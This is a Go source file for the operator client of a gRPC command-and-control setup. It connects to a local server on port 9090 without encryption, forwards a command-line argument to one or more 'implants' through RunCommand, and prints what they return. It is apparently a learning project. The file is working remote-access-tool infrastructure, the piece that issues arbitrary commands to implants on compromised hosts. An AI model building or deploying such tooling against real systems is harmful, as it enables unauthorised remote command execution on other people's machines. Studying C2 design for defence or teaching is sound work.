package main

import (
	"context"
	"fmt"
	"gore/grpcapi"
	"log"
	"os"

	"google.golang.org/grpc"
)

/*we invoke this as "go run client/glient.go" and the second input is the command we want to run on our implant(s). */
func main() {
	//variable initilizations
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)
	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal(err)
	}
	//clean on close
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn) //create instance of Admin client
	//
	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1] //assuming there is a command line command in the input buffer, we read it in to the OS. no error checking is doe for now :P
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd) //route the command to the client's RunCommand function
	if err != nil {
		log.Fatal(err)
	}
	//print the output that is given by the implant
	fmt.Println(cmd.Out)
}
